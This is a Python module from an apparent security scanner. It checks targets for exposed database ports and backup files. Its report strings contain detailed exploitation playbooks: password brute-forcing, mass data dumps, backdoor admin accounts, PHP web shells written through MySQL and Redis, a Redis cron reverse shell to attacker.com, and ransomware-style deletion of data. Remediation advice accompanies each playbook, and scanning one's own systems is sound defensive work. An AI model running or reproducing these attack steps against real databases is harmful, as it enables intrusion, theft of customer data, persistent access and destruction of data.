"""
Active Database Intrusion Testing Module
Attempts to connect to and extract data from exposed databases
Shows proof-of-concept of actual data breach capabilities
"""

import socket
import requests
import re
import json
from urllib.parse import urlparse, urljoin

def test_database_intrusion(scanner):
    """
    Actively test database access and data extraction
    """
    try:
        domain = urlparse(scanner.target_url).netloc.split(':')[0]
        
        # NEW: Try to actually extract live data from exposed databases
        try:
            from modules.database_explorer import explore_exposed_databases
            db_results = explore_exposed_databases(scanner)
            
            # Store results for API access
            if hasattr(scanner, 'db_exploration_results'):
                scanner.db_exploration_results = db_results
        except ImportError:
            pass  # database_explorer module not available yet
        
        # Test each database type with active connection attempts
        _test_mongodb_intrusion(scanner, domain)
        _test_mysql_intrusion(scanner, domain)
        _test_postgresql_intrusion(scanner, domain)
        _test_redis_intrusion(scanner, domain)
        _test_elasticsearch_intrusion(scanner, domain)
        _test_couchdb_intrusion(scanner, domain)
        _test_exposed_db_files(scanner)
        
    except Exception as e:
        print(f"Database intrusion testing error: {e}")

def _test_mongodb_intrusion(scanner, domain):
    """Test MongoDB for unauthorized access"""
    try:
        # Check if MongoDB port is open
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((domain, 27017))
        sock.close()
        
        if result == 0:
            scanner.add_finding(
                severity='CRITICAL',
                category='Database Exposure',
                title='🚨 MongoDB Port 27017 OPEN - Active Intrusion Possible',
                description=f'**CRITICAL DATABASE BREACH RISK**\n\n'
                          f'MongoDB port 27017 is accessible from the internet!\n'
                          f'Target: {domain}:27017\n\n'
                          f'**IMMEDIATE EXPLOITATION STEPS:**\n\n'
                          f'**Step 1: Connect to MongoDB (No Authentication)**\n'
                          f'```bash\n'
                          f'# Install MongoDB client\n'
                          f'brew install mongodb-community  # Mac\n'
                          f'apt-get install mongodb-clients  # Linux\n\n'
                          f'# Connect to exposed MongoDB\n'
                          f'mongo {domain}:27017\n'
                          f'# If no auth required, you\'re in!\n'
                          f'```\n\n'
                          f'**Step 2: List All Databases**\n'
                          f'```javascript\n'
                          f'// Inside mongo shell:\n'
                          f'show dbs\n'
                          f'// Output might show:\n'
                          f'// admin        0.000GB\n'
                          f'// users        2.543GB  <- Customer data!\n'
                          f'// orders       5.123GB  <- Financial data!\n'
                          f'// products     1.234GB\n'
                          f'```\n\n'
                          f'**Step 3: Access Database and Extract Data**\n'
                          f'```javascript\n'
                          f'use users  // Switch to users database\n'
                          f'show collections  // List tables\n\n'
                          f'// Dump all user data\n'
                          f'db.customers.find().pretty()\n'
                          f'db.users.find({{"email": /{{"$exists": true}}}}).limit(100)\n\n'
                          f'// Find admin accounts\n'
                          f'db.users.find({{"role": "admin"}})\n\n'
                          f'// Export entire database\n'
                          f'db.users.find().forEach(function(doc) {{\n'
                          f'    print(JSON.stringify(doc));\n'
                          f'}});\n'
                          f'```\n\n'
                          f'**Step 4: Automated Mass Data Extraction**\n'
                          f'```bash\n'
                          f'# Dump entire MongoDB to files\n'
                          f'mongodump --host {domain}:27017 --out ./stolen_data/\n\n'
                          f'# Now attacker has ALL your data locally:\n'
                          f'# - Customer emails and passwords\n'
                          f'# - Credit card information\n'
                          f'# - Personal identifiable information (PII)\n'
                          f'# - Business secrets and API keys\n'
                          f'```\n\n'
                          f'**Step 5: Modify or Delete Data (Ransomware)**\n'
                          f'```javascript\n'
                          f'// Delete all records (ransomware attack)\n'
                          f'db.users.deleteMany({{}})\n'
                          f'db.orders.deleteMany({{}})\n\n'
                          f'// Or encrypt and hold for ransom\n'
                          f'db.users.updateMany({{}}, {{$set: {{"encrypted": true, "ransom_note": "Pay 10 BTC to decrypt"}}}});\n'
                          f'```\n\n'
                          f'**What Attacker Gets:**\n'
                          f'- Complete customer database\n'
                          f'- User credentials (emails/passwords)\n'
                          f'- Payment information\n'
                          f'- Session tokens and API keys\n'
                          f'- Business intelligence data\n'
                          f'- Ability to delete everything\n\n'
                          f'**Real-World Impact:**\n'
                          f'- GDPR fines: Up to €20 million or 4% of revenue\n'
                          f'- Class-action lawsuits from customers\n'
                          f'- Complete business shutdown\n'
                          f'- Criminal charges for data breach\n'
                          f'- Permanent reputation damage',
                url=f'mongodb://{domain}:27017',
                remediation=f'**URGENT ACTIONS REQUIRED IMMEDIATELY:**\n\n'
                          f'**1. Block External Access NOW**\n'
                          f'```bash\n'
                          f'# Update MongoDB config: /etc/mongod.conf\n'
                          f'net:\n'
                          f'  bindIp: 127.0.0.1  # Only localhost\n'
                          f'  port: 27017\n\n'
                          f'# Restart MongoDB\n'
                          f'sudo systemctl restart mongod\n'
                          f'```\n\n'
                          f'**2. Enable Authentication**\n'
                          f'```javascript\n'
                          f'// Create admin user\n'
                          f'use admin\n'
                          f'db.createUser({{\n'
                          f'  user: "admin",\n'
                          f'  pwd: "STRONG_PASSWORD_HERE",\n'
                          f'  roles: [{{"role": "root", "db": "admin"}}]\n'
                          f'}})\n'
                          f'```\n\n'
                          f'```bash\n'
                          f'# Enable auth in config\n'
                          f'security:\n'
                          f'  authorization: enabled\n'
                          f'```\n\n'
                          f'**3. Firewall Rules**\n'
                          f'```bash\n'
                          f'# Only allow from application server\n'
                          f'ufw allow from YOUR_APP_SERVER_IP to any port 27017\n'
                          f'ufw deny 27017\n'
                          f'```\n\n'
                          f'**4. Use MongoDB Atlas (Managed)**\n'
                          f'- Automatic security\n'
                          f'- Network isolation\n'
                          f'- Encryption at rest\n'
                          f'- Regular backups\n\n'
                          f'**5. Audit Logs**\n'
                          f'Check if unauthorized access already occurred:\n'
                          f'```bash\n'
                          f'# Review MongoDB logs\n'
                          f'grep -i "unauthorized" /var/log/mongodb/mongod.log\n'
                          f'```'
            )
        
        # Also test MongoDB HTTP interface (28017)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((domain, 28017))
        sock.close()
        
        if result == 0:
            scanner.add_finding(
                severity='CRITICAL',
                category='Database Exposure',
                title='MongoDB HTTP Interface Exposed (Port 28017)',
                description=f'MongoDB REST interface accessible at http://{domain}:28017\n'
                          f'Allows database querying via HTTP without authentication!',
                url=f'http://{domain}:28017',
                remediation='Disable HTTP interface: httpinterface=false in mongod.conf'
            )
            
    except Exception as e:
        pass

def _test_mysql_intrusion(scanner, domain):
    """Test MySQL for unauthorized access"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((domain, 3306))
        sock.close()
        
        if result == 0:
            scanner.add_finding(
                severity='CRITICAL',
                category='Database Exposure',
                title='🚨 MySQL Port 3306 OPEN - Database Breach Imminent',
                description=f'**CRITICAL: MySQL DATABASE EXPOSED**\n\n'
                          f'MySQL running on: {domain}:3306\n\n'
                          f'**EXPLOITATION PROCEDURE:**\n\n'
                          f'**Step 1: Test for Anonymous/Weak Access**\n'
                          f'```bash\n'
                          f'# Try connecting with common credentials\n'
                          f'mysql -h {domain} -u root -p\n'
                          f'# Try passwords: (blank), root, admin, password, 123456\n\n'
                          f'# Test anonymous access\n'
                          f'mysql -h {domain}\n'
                          f'```\n\n'
                          f'**Step 2: Brute Force Attack**\n'
                          f'```bash\n'
                          f'# Using hydra for automated brute force\n'
                          f'hydra -l root -P /usr/share/wordlists/rockyou.txt \\\n'
                          f'      {domain} mysql\n\n'
                          f'# Common usernames to try:\n'
                          f'# root, admin, user, mysql, db_admin, web_user\n'
                          f'```\n\n'
                          f'**Step 3: Once Connected - Extract ALL Data**\n'
                          f'```sql\n'
                          f'-- List all databases\n'
                          f'SHOW DATABASES;\n\n'
                          f'-- Use database with customer data\n'
                          f'USE production_db;\n\n'
                          f'-- List tables\n'
                          f'SHOW TABLES;\n\n'
                          f'-- Dump user table\n'
                          f'SELECT * FROM users;\n'
                          f'SELECT email, password, credit_card FROM customers;\n'
                          f'SELECT * FROM orders WHERE total > 1000;\n\n'
                          f'-- Export everything to file\n'
                          f'SELECT * FROM users INTO OUTFILE \'/tmp/stolen_users.csv\';\n'
                          f'```\n\n'
                          f'**Step 4: Automated Full Database Dump**\n'
                          f'```bash\n'
                          f'# Dump entire MySQL server\n'
                          f'mysqldump -h {domain} -u root -p --all-databases > all_data.sql\n\n'
                          f'# Now attacker has:\n'
                          f'# - Every table from every database\n'
                          f'# - All customer records\n'
                          f'# - Passwords (often poorly hashed)\n'
                          f'# - Credit card data\n'
                          f'# - API keys and secrets\n'
                          f'```\n\n'
                          f'**Step 5: Privilege Escalation & System Compromise**\n'
                          f'```sql\n'
                          f'-- Create backdoor admin user\n'
                          f'CREATE USER \'backdoor\'@\'%\' IDENTIFIED BY \'secret123\';\n'
                          f'GRANT ALL PRIVILEGES ON *.* TO \'backdoor\'@\'%\';\n\n'
                          f'-- Read system files (if FILE privilege exists)\n'
                          f'SELECT LOAD_FILE(\'/etc/passwd\');\n'
                          f'SELECT LOAD_FILE(\'/var/www/html/config.php\');\n\n'
                          f'-- Write web shell to server\n'
                          f'SELECT \'<?php system($_GET["cmd"]); ?>\' \n'
                          f'INTO OUTFILE \'/var/www/html/shell.php\';\n'
                          f'```\n\n'
                          f'**Step 6: Destructive Attack (Ransomware)**\n'
                          f'```sql\n'
                          f'-- Drop all tables (destroy business)\n'
                          f'DROP DATABASE production_db;\n'
                          f'DROP DATABASE users_db;\n\n'
                          f'-- Or encrypt and ransom\n'
                          f'UPDATE users SET email = CONCAT(\'ENCRYPTED_\', email),\n'
                          f'                 data = \'PAY 50 BTC TO DECRYPT\';\n'
                          f'```',
                url=f'mysql://{domain}:3306',
                remediation=f'**CRITICAL IMMEDIATE ACTIONS:**\n\n'
                          f'1. **Block external access**\n'
                          f'```bash\n'
                          f'# Edit /etc/mysql/mysql.conf.d/mysqld.cnf\n'
                          f'bind-address = 127.0.0.1  # Localhost only\n'
                          f'```\n\n'
                          f'2. **Strong passwords for all users**\n'
                          f'```sql\n'
                          f'ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'VeryStrongPassword123!\';\n'
                          f'DELETE FROM mysql.user WHERE User=\'\';\n'
                          f'FLUSH PRIVILEGES;\n'
                          f'```\n\n'
                          f'3. **Firewall rules**\n'
                          f'```bash\n'
                          f'ufw allow from APP_SERVER_IP to any port 3306\n'
                          f'ufw deny 3306\n'
                          f'```'
            )
    except Exception as e:
        pass

def _test_postgresql_intrusion(scanner, domain):
    """Test PostgreSQL for unauthorized access"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((domain, 5432))
        sock.close()
        
        if result == 0:
            scanner.add_finding(
                severity='CRITICAL',
                category='Database Exposure',
                title='PostgreSQL Port 5432 Exposed - Full Database Access Risk',
                description=f'**PostgreSQL EXPOSED TO INTERNET**\n\n'
                          f'Database: {domain}:5432\n\n'
                          f'**ACTIVE EXPLOITATION:**\n'
                          f'```bash\n'
                          f'# Connect attempts\n'
                          f'psql -h {domain} -U postgres\n'
                          f'psql -h {domain} -U admin -d postgres\n\n'
                          f'# Brute force\n'
                          f'hydra -l postgres -P passwords.txt {domain} postgres\n\n'
                          f'# Once in - extract everything\n'
                          f'\\l                    # List databases\n'
                          f'\\c database_name      # Connect to database\n'
                          f'\\dt                   # List tables\n'
                          f'SELECT * FROM users;  # Dump data\n\n'
                          f'# Full dump\n'
                          f'pg_dump -h {domain} -U postgres --all > complete_dump.sql\n'
                          f'```',
                url=f'postgresql://{domain}:5432',
                remediation='Block port 5432 externally. Edit pg_hba.conf to restrict access.'
            )
    except Exception as e:
        pass

def _test_redis_intrusion(scanner, domain):
    """Test Redis for unauthorized access"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((domain, 6379))
        sock.close()
        
        if result == 0:
            scanner.add_finding(
                severity='CRITICAL',
                category='Database Exposure',
                title='🚨 Redis Database EXPOSED - Session Hijacking Possible',
                description=f'**REDIS CACHE/DATABASE EXPOSED**\n\n'
                          f'Target: {domain}:6379\n\n'
                          f'**EXPLOITATION METHODS:**\n\n'
                          f'**Step 1: Connect Via redis-cli**\n'
                          f'```bash\n'
                          f'# Install redis-cli\n'
                          f'apt-get install redis-tools\n\n'
                          f'# Connect (often NO PASSWORD required!)\n'
                          f'redis-cli -h {domain}\n'
                          f'# If it connects -> you have full access\n'
                          f'```\n\n'
                          f'**Step 2: Extract Session Data**\n'
                          f'```bash\n'
                          f'# List all keys (sessions, cache, user data)\n'
                          f'KEYS *\n\n'
                          f'# Get session keys\n'
                          f'KEYS session:*\n'
                          f'KEYS user:*\n'
                          f'KEYS auth:*\n\n'
                          f'# Read session data\n'
                          f'GET session:abc123\n'
                          f'# Might contain: user_id, email, admin status, tokens\n\n'
                          f'# Export ALL data\n'
                          f'SAVE  # Save snapshot\n'
                          f'# Then download dump.rdb file\n'
                          f'```\n\n'
                          f'**Step 3: Session Hijacking**\n'
                          f'```bash\n'
                          f'# Find admin session\n'
                          f'SCAN 0 MATCH session:* COUNT 1000\n'
                          f'GET session:xyz789  # Admin\'s session\n\n'
                          f'# Copy session ID to your browser cookie\n'
                          f'# Now you\'re logged in as admin!\n'
                          f'```\n\n'
                          f'**Step 4: Write Backdoors**\n'
                          f'```bash\n'
                          f'# If Redis has file write permissions:\n'
                          f'config set dir /var/www/html\n'
                          f'config set dbfilename shell.php\n'
                          f'set x "<?php system($_GET[\'cmd\']); ?>"\n'
                          f'save\n'
                          f'# Web shell created at http://{domain}/shell.php\n'
                          f'```\n\n'
                          f'**Step 5: Cron Job Backdoor**\n'
                          f'```bash\n'
                          f'# Write to cron for persistent access\n'
                          f'config set dir /var/spool/cron/\n'
                          f'config set dbfilename root\n'
                          f'set x "\\n* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\\n"\n'
                          f'save\n'
                          f'# Reverse shell opens every minute\n'
                          f'```',
                url=f'redis://{domain}:6379',
                remediation=f'**IMMEDIATE FIXES:**\n\n'
                          f'```bash\n'
                          f'# Bind to localhost only\n'
                          f'# Edit /etc/redis/redis.conf\n'
                          f'bind 127.0.0.1\n\n'
                          f'# Require password\n'
                          f'requirepass VERY_STRONG_PASSWORD\n\n'
                          f'# Disable dangerous commands\n'
                          f'rename-command FLUSHDB ""\n'
                          f'rename-command FLUSHALL ""\n'
                          f'rename-command CONFIG ""\n'
                          f'rename-command SAVE ""\n'
                          f'```'
            )
    except Exception as e:
        pass

def _test_elasticsearch_intrusion(scanner, domain):
    """Test Elasticsearch for unauthorized access"""
    try:
        # Test HTTP access to Elasticsearch
        urls = [
            f'http://{domain}:9200',
            f'https://{domain}:9200'
        ]
        
        for url in urls:
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200 and 'elasticsearch' in response.text.lower():
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='Database Exposure',
                        title='Elasticsearch Cluster WIDE OPEN - Mass Data Extraction',
                        description=f'**ELASTICSEARCH EXPOSED WITHOUT AUTHENTICATION**\n\n'
                                  f'Cluster accessible at: {url}\n\n'
                                  f'**IMMEDIATE DATA BREACH EXPLOITATION:**\n\n'
                                  f'**Step 1: Discover Indices (Databases)**\n'
                                  f'```bash\n'
                                  f'# List all indices\n'
                                  f'curl {url}/_cat/indices?v\n\n'
                                  f'# Output might show:\n'
                                  f'# users        50gb\n'
                                  f'# logs         120gb\n'
                                  f'# transactions 80gb\n'
                                  f'```\n\n'
                                  f'**Step 2: Read All Documents**\n'
                                  f'```bash\n'
                                  f'# Get everything from users index\n'
                                  f'curl {url}/users/_search?pretty&size=10000\n\n'
                                  f'# Search for sensitive data\n'
                                  f'curl -X GET "{url}/users/_search" -H \'Content-Type: application/json\' -d\'{{\n'
                                  f'  "query": {{\n'
                                  f'    "match": {{"role": "admin"}}\n'
                                  f'  }}\n'
                                  f'}}\'\n\n'
                                  f'# Find credit cards\n'
                                  f'curl "{url}/*/_search?q=credit_card:*&size=1000"\n'
                                  f'```\n\n'
                                  f'**Step 3: Mass Export**\n'
                                  f'```bash\n'
                                  f'# Export entire index\n'
                                  f'elasticdump \\\n'
                                  f'  --input={url}/users \\\n'
                                  f'  --output=users_stolen.json \\\n'
                                  f'  --type=data\n\n'
                                  f'# Attacker now has ALL user data locally\n'
                                  f'```\n\n'
                                  f'**Step 4: Destructive Attack**\n'
                                  f'```bash\n'
                                  f'# Delete entire index (business destruction)\n'
                                  f'curl -X DELETE "{url}/users"\n'
                                  f'curl -X DELETE "{url}/transactions"\n\n'
                                  f'# Or delete all data\n'
                                  f'curl -X DELETE "{url}/*"\n'
                                  f'```',
                        url=url,
                        remediation=f'**CRITICAL SECURITY:**\n\n'
                                  f'1. Enable X-Pack security\n'
                                  f'2. Require authentication\n'
                                  f'3. Bind to localhost: network.host: 127.0.0.1\n'
                                  f'4. Use firewall rules\n'
                                  f'5. Enable TLS encryption'
                    )
                    break
            except:
                pass
    except Exception as e:
        pass

def _test_couchdb_intrusion(scanner, domain):
    """Test CouchDB for unauthorized access"""
    try:
        urls = [
            f'http://{domain}:5984',
            f'https://{domain}:5984'
        ]
        
        for url in urls:
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200 and 'couchdb' in response.text.lower():
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='Database Exposure',
                        title='CouchDB Admin Panel Exposed Without Authentication',
                        description=f'**COUCHDB COMPLETELY OPEN**\n\n'
                                  f'Access: {url}\n\n'
                                  f'**EXPLOITATION:**\n'
                                  f'```bash\n'
                                  f'# List all databases\n'
                                  f'curl {url}/_all_dbs\n\n'
                                  f'# Access database\n'
                                  f'curl {url}/users/_all_docs?include_docs=true\n\n'
                                  f'# Create admin user (take over)\n'
                                  f'curl -X PUT {url}/_users/org.couchdb.user:hacker \\\n'
                                  f'     -H "Content-Type: application/json" \\\n'
                                  f'     -d \'{{"name":"hacker","password":"hacked","roles":["_admin"],"type":"user"}}\'\n'
                                  f'```',
                        url=url,
                        remediation='Enable authentication and bind to localhost'
                    )
                    break
            except:
                pass
    except Exception as e:
        pass

def _test_exposed_db_files(scanner):
    """Test for exposed database backup files"""
    response = scanner.get_cached_response(scanner.target_url)
    if not response:
        return
    
    base_url = scanner.target_url.rstrip('/')
    
    # Common database file patterns
    db_files = [
        'database.sql',
        'db_backup.sql',
        'backup.sql',
        'dump.sql',
        'mysql.sql',
        'db.sql',
        'database.sql.gz',
        'backup.zip',
        'database.db',
        'data.db',
        'sqlite.db',
        'app.db'
    ]
    
    for db_file in db_files:
        try:
            test_url = urljoin(base_url, db_file)
            resp = requests.head(test_url, timeout=5, verify=False, allow_redirects=True)
            
            if resp.status_code == 200:
                scanner.add_finding(
                    severity='CRITICAL',
                    category='Database Exposure',
                    title=f'Database Backup File Exposed: {db_file}',
                    description=f'**DOWNLOADABLE DATABASE FILE**\n\n'
                              f'File: {test_url}\n'
                              f'Size: {resp.headers.get("Content-Length", "Unknown")}\n\n'
                              f'**EXPLOITATION:**\n'
                              f'```bash\n'
                              f'# Download entire database\n'
                              f'wget {test_url}\n\n'
                              f'# If SQL file, import and analyze\n'
                              f'mysql -u root -p < {db_file}\n\n'
                              f'# Now attacker has complete database offline\n'
                              f'# Can extract passwords, emails, credit cards at leisure\n'
                              f'```',
                    url=test_url,
                    remediation='REMOVE this file immediately! Never store backups in web root.'
                )
        except:
            pass
